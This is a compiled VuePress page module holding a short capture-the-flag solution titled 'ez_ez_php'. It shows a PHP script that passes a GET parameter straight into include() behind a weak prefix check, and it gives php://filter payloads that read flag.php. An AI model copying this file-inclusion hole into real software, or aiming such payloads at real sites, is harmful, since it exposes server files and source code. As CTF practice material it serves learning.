import{_ as n,o as s,c as a,e}from"./app-3b511de6.js";const p={},t=e(`<p>#PHP #PHP伪协议</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;php&quot;</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Nice!!!&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 

    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Hacker!!&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//flag.php </span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">file</span>=<span class="token value">php://filter/resource=flag.php</span></span></span>

<span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">file</span>=<span class="token value">php://filter/resource=flag</span></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),o=[t];function l(c,i){return s(),a("div",null,o)}const r=n(p,[["render",l],["__file","ez_ez_php.html.vue"]]);export{r as default};
